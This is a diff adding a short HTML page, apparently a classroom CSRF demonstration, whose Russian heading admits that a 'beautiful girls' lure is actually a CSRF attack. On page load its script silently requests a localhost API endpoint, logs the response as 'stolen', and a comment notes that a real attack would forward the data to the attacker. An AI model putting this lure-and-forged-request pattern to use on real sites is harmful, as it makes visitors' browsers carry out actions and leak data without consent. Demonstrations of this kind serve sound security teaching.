@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Девушки</title>
+</head>
+<body>
+    <h1>Красивые девушки, а на самом деле CSRF</h1>
+</body>
+<script>
+    var url="http://localhost/api/minus.php?x=2&y=1";
+    var xhr=new XMLHttpRequest();
+    xhr.open("GET",url,false);
+    xhr.send();
+    var result=xhr.responseText;
+    console.log("Украдено:  "+result);
+    //сли кража была бы удачной, другой выб запрос отправил бы данные хакеру
+</script>
+</html>
